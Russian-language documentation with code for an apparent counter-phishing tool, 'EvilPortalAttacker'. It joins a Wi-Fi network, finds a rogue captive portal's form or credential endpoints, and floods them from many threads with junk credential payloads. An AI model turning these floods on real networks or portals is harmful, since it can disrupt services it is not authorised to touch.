# EvilPortalAttacker

## Описание

EvilPortalAttacker - это модуль, реализующий методы атак на Evil Portal сети. Он обеспечивает:
- Различные методы атак
- Управление потоками
- Обработку результатов
- Определение успешности атак

## Основные функции

### Инициализация
```python
def __init__(self):
    self.network_manager = NetworkManager()
    self.logger = logging.getLogger(__name__)
    self.attack_successful = False
```

### Основная функция атаки
```python
def attack_network(self, ssid: str, url: str) -> bool:
    self.attack_successful = False
    
    if not self.network_manager.connect_to_network(ssid):
        self.logger.error(f"Не удалось подключиться к сети {ssid}")
        return False

    try:
        # Атака через SSID метод
        if self._attack_ssid_method(ssid, url):
            return True

        # Атака через CREDS метод
        if self._attack_creds_method(ssid, url):
            return True

        # Атака через FORM метод
        if self._attack_form_method(ssid, url):
            return True

        # Атака через FETCH метод
        if self._attack_fetch_method(ssid, url):
            return True

        # Атака через XMLHttpRequest метод
        if self._attack_xmlhttp_method(ssid, url):
            return True

    except Exception as e:
        self.logger.error(f"Ошибка при атаке сети {ssid}: {str(e)}")
    
    return self.attack_successful
```

### Методы атак

#### SSID метод
```python
def _attack_ssid_method(self, ssid: str, url: str) -> bool:
    try:
        response = self.network_manager.send_request(url + 'ssid')
        action = self._extract_action(response.text)
        if not action:
            return False

        self.logger.info(f'Найдена ссылка: {action}')
        self.logger.info(f'Атакуем {ssid} через SSID метод...')
        
        threads = self._create_attack_threads(ssid, action)
        return self._execute_threads(threads)
    except Exception as e:
        self.logger.error(f"Ошибка в SSID методе: {str(e)}")
        return False
```

#### CREDS метод
```python
def _attack_creds_method(self, ssid: str, url: str) -> bool:
    try:
        response = self.network_manager.send_request(url)
        methods = ['/post', '/get', '/postcreds', '/creds', '/add']
        
        for method in methods:
            if method in response.text:
                self.logger.info(f'Найдена ссылка: {method}')
                self.logger.info(f'Атакуем {ssid} через CREDS метод...')
                
                payload = self._generate_creds_payload()
                threads = self._create_creds_threads(ssid, url, method, payload)
                if self._execute_threads(threads):
                    return True
    except Exception as e:
        self.logger.error(f"Ошибка в CREDS методе: {str(e)}")
    return False
```

### Управление потоками

#### Создание потоков
```python
def _create_attack_threads(self, ssid: str, action: str) -> List[threading.Thread]:
    threads = []
    for _ in range(THREAD_COUNT):
        thread = threading.Thread(target=self._attack_thread, args=(ssid, action))
        threads.append(thread)
    return threads
```

#### Выполнение потоков
```python
def _execute_threads(self, threads: List[threading.Thread]) -> bool:
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    return self.attack_successful
```

### Генерация payload
```python
def _generate_creds_payload(self) -> str:
    payload = '?email=24wpoerufjklasdhrkj53hrekjdfhnk23hdef'
    for _ in range(100):
        key = self.network_manager.generate_random_string()
        value = self.network_manager.generate_random_string(PAYLOAD_CHUNK_SIZE)
        payload += f'&{key}={value}'
    return payload
```

## Использование

```python
# Создание экземпляра
attacker = EvilPortalAttacker()

# Атака на сеть
success = attacker.attack_network('target_ssid', 'http://target.com/')
if success:
    print('Атака успешна')
else:
    print('Атака не удалась')
```

## Обработка ошибок

Модуль обрабатывает следующие типы ошибок:
- Ошибки подключения
- Ошибки HTTP запросов
- Ошибки потоков
- Ошибки генерации payload

Все ошибки логируются и обрабатываются на уровне модуля. 